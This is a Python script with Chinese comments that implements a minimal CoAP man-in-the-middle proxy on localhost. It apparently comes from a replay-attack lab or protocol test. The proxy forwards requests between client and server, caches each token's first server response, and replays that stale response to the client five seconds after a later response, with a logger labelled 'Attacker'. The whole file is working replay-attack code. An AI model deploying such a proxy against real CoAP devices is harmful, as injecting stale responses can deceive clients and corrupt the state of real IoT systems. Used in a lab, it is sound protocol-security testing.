#!/usr/bin/env python3
"""
CoAP MITM 代理 - 极简版
监听 5684，转发到服务器 5683
"""
import asyncio
import socket
import struct
import logging
from message_validator import validate_message, bytes_diff, debug_message

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Attacker")

# 是否启用消息验证（生产环境可关闭）
VALIDATION_ENABLED = True

class MITMProxy:
    def __init__(self, listen_port=5684, server_port=5683):
        self.listen_port = listen_port
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.clients = {}  # token -> client_addr
        self.cached = {}    # token -> (data, client_addr)
        self.request_count = {}  # token -> 请求次数
        self.pending_replay = {}  # token -> 是否需要重放

    async def handle(self, data, addr):
        """处理来自客户端或服务器的消息"""
        # 输出原始数据调试信息
        for line in debug_message(data, f"IN from {addr}"):
            logger.debug(line)
        
        if len(data) < 4:
            logger.warning(f"数据太短，丢弃: {len(data)} bytes")
            return
        
        # 解析 CoAP 头
        tkl = data[0] & 0x0F
        code = data[1]
        token = data[4:4+tkl] if tkl > 0 else b''
        token_hex = token.hex() or 'none'
        
        is_request = 1 <= code <= 31
        is_response = code >= 64
        
        # 验证消息格式
        if VALIDATION_ENABLED:
            direction = "请求" if is_request else "响应"
            ok, err = validate_message(data, f"{direction} {token_hex}")
            if not ok:
                logger.error(f"消息验证失败: {err}")
                # 打印更详细的调试信息
                for line in debug_message(data, "FAILED"):
                    logger.error(line)
                return
        
        if is_request:
            # 来自客户端的请求
            self.clients[token_hex] = addr
            self.request_count[token_hex] = self.request_count.get(token_hex, 0) + 1
            logger.info(f"请求 -> 服务器 | Token: {token_hex} (第{self.request_count[token_hex]}次)")
            
            if VALIDATION_ENABLED:
                logger.debug(f"转发请求到服务器: {data.hex()}")
            
            self.sock.sendto(data, ("127.0.0.1", self.server_port))
            
        elif is_response and token_hex in self.clients:
            # 来自服务器的响应
            client_addr = self.clients[token_hex]
            
            if token_hex not in self.cached:
                # 第一次响应：缓存，标记需要重放
                self.cached[token_hex] = (data, client_addr)
                self.pending_replay[token_hex] = True
                logger.info(f"响应 -> 缓存 | Token: {token_hex} (等待第二次请求完成后重放)")
            else:
                # 后续响应：正常转发
                logger.info(f"响应 -> 客户端 | Token: {token_hex}")
                
                # 先转发响应给客户端
                if VALIDATION_ENABLED:
                    old_data, _ = self.cached[token_hex]
                    if old_data != data:
                        logger.warning(f"响应内容变化，调试差异:")
                        for line in bytes_diff(old_data, data, token_hex):
                            logger.warning(line)
                    logger.debug(f"转发响应到客户端: {data.hex()}")
                
                self.sock.sendto(data, client_addr)
                
                # 检查是否需要触发重放（第二次请求的响应已收到）
                if self.pending_replay.get(token_hex):
                    logger.warning(f"第二次响应已收到，5秒后重放 | Token: {token_hex}")
                    asyncio.create_task(self.replay_after_delay(token_hex, 5))
                    self.pending_replay[token_hex] = False

    async def replay_after_delay(self, token_hex, delay):
        """延迟后重放缓存的响应"""
        await asyncio.sleep(delay)
        if token_hex in self.cached:
            data, addr = self.cached[token_hex]
            logger.warning(f"重放旧响应 -> 客户端 | Token: {token_hex}")
            self.sock.sendto(data, addr)

    async def run(self):
        self.sock.bind(("127.0.0.1", self.listen_port))
        logger.info(f"代理启动: 127.0.0.1:{self.listen_port} -> 127.0.0.1:{self.server_port}")
        
        loop = asyncio.get_event_loop()
        while True:
            data, addr = await loop.run_in_executor(
                None, self.sock.recvfrom, 4096)
            await self.handle(data, addr)

if __name__ == "__main__":
    asyncio.run(MITMProxy().run())
